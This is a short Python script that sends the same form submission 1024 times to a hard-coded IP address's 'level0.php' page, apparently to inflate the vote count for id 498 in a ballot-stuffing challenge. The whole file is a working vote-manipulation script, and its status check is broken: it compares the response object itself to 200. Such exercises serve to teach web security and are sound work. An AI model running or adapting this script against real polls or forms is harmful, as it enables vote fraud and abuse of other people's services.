#!/usr/bin/python3
""" Module that executes HTTP POST request """

import requests

url = "http://158.69.76.135/level0.php"
payload = {'id': '498', 'holdthedoor': 'Submit'}


def vote():
    """ Check that server is open """
    response = requests.get(url)

    if response != 200:
        print("HTTP response {}".format(response))

    """ Send payload 1024 times """
    for i in range(0, 1024):
        post = requests.post(url, data=payload)

    print("vote successful")

if __name__ == "__main__":
    vote()
